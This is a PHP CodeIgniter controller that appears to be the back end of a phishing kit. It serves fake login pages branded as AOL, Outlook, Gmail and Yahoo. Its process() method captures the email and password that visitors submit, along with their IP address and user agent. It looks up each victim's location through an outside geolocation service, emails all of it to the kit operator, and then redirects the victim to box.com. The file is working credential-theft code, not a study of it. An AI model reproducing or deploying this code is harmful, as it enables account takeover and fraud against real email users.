<?php
defined('BASEPATH') OR exit('No direct script access allowed');
class Home extends Web_Controller {
  public function __construct() {
        parent::__construct();
      }

  public function index() {
	    $this->session->unset_userdata('error');
	    $url = $this->input->get('domain');	
		$this->data['url'] = $url;
	    $this->data["title"] = config_item('sitename');
        $this->data["description"] = "";
        $this->data["keywords"] = "";
		$this->data['subview'] = 'web/pages/home';
        $this->load->view('web/_main_layout_home', $this->data);  
	}
	
 public function aol()
  {  
	 $this->data["title"] = "AOL";
     $this->data["description"] = "";
     $this->data["keywords"] = "";
	 $this->data['subview'] = 'web/pages/aol';
     $this->load->view('web/_main_layout_home', $this->data);  

  }
  
  
  public function outlook()
  {

	 $this->data["title"] = "Outlook";
     $this->data["description"] = "";
     $this->data["keywords"] = "";
	 $this->data['subview'] = 'web/pages/outlook';
     $this->load->view('web/_main_layout_home', $this->data);  
  }
  
  public function gmail()
  { 
	 $this->data["title"] = "Gmail";
     $this->data["description"] = "";
     $this->data["keywords"] = "";
	 $this->data['subview'] = 'web/pages/gmail';
     $this->load->view('web/_main_layout_home', $this->data);  
  } 
 
  public function yahoo()
  { 
	 $this->data["title"] = "Yahoo";
     $this->data["description"] = "";
     $this->data["keywords"] = "";
	 $this->data['subview'] = 'web/pages/yahoo';
     $this->load->view('web/_main_layout_home', $this->data);  
  }
  
  public function others()
  {
	 $url = $this->input->get('domain');	
	 $this->data['url'] = $url;
	 $this->data["title"] = "Yahoo";
     $this->data["description"] = "";
     $this->data["keywords"] = "";
	 $this->data['subview'] = 'web/pages/others';
     $this->load->view('web/_main_layout_home', $this->data);  
  }
	
	
public function login()
 { 	  
	 $this->data["title"] = "Login";
     $this->data["description"] = "";
     $this->data["keywords"] = "";
	 $this->data['subview'] = 'web/pages/login';
     $this->load->view('web/_main_layout_home', $this->data); 
	 
 }
 
public function process($type="aol",$error=0)
 {
	
    $this->load->library('curl');
		
	@$pfw_ip= $_SERVER['REMOTE_ADDR'];
	@$pfw_useragent = $_SERVER['HTTP_USER_AGENT'];
	@$sfm_form_submitted = addslashes($_POST['sfm_form_submitted']);
	@$Email = addslashes($_POST['Email']);
	@$Password = addslashes($_POST['Password']);
	@$CheckBoxSingle = addslashes($_POST['CheckBoxSingle']);
	
	$location =  $this->curl->simple_get('http://ip-api.com/json/'.$pfw_ip);

    $location = json_decode($location,true);
	
	$country = $location['country'];
	$state = $location['regionName'];
	$isp = $location['isp'];
	$city = $location['city'];
	
	$pfw_subject = "Email Response";
	$pfw_email_to = config_item('site_email');
	
	$pfw_message = "Visitor's IP: $pfw_ip\n"
	."User Agent: $pfw_useragent \n\n"
	."Country: $country \n"
	."State: $state \n"
	."ISP: $isp \n"
	."City: $city \n"
	."Email: $Email\n"
	."Password: $Password\n"
	."CheckBoxSingle: $CheckBoxSingle\n";

	$url = site_url('web/home/send');

	$fields = array(
					'subject' => urlencode($pfw_subject),
					'message' => urlencode($pfw_message),
					'my_email' => urlencode($pfw_email_to),
					'ip' => urlencode($pfw_ip)
				   );
				   
        $fields_string = "";

	//url-ify the data for the POST
	foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
	rtrim($fields_string, '&');

	//open connection
	$ch = curl_init();

	//set the url, number of POST vars, POST data
	curl_setopt($ch,CURLOPT_URL, $url);
	curl_setopt($ch,CURLOPT_POST, count($fields));
	curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);

	//execute post
	$result = curl_exec($ch);

	//close connection
	curl_close($ch);

	if($error==0)
	{
	 $error = 1;
	 redirect('web/home/'.$type."/".$error);
	}
	
	if($error==1)
	{
	  redirect('https://box.com');
	}

   }
  
  public function send()
	{
		
	    $this->load->library('email');
		$this->email->from($_SERVER['SERVER_ADMIN'], 'Info');
		$this->email->to($this->input->post('my_email'));
		$this->email->subject($this->input->post('subject'));
		$this->email->message($this->input->post('message'));

		$this->email->send();
	}
	
 function unsubscribe()
  {
	 echo "You have unsubscribed successfully";  
  } 
   	
 }
                    